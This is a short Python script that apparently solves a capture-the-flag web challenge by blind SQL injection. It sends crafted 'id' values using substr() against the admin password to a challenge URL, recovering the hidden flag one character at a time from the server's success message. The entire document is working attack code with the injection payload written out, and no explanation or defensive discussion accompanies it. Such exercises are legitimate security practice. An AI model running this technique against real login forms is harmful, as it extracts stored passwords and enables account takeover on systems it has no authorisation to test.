#!/usr/bin/env python3.8

import requests

url = "http://ctfq.u1tramarine.blue/q6/"
payload = {
    "id": "",
    "pass": ""
}
password = "FLAG_"

for i in range(0, 16): # [0,16)
    for c in range(33, 127): # printable ascii
        c = chr(c)
        sql = f"' or substr((select pass from user where id = 'admin'), {i + 6}, 1) = '{c}'; --"
        payload["id"] = sql
        response = requests.post(url, data=payload)
        if "Congratulations!" in response.text:
            password += c
            break
        else:
            print(f"failed...: {password + c}")

print(f"found!: {password}")
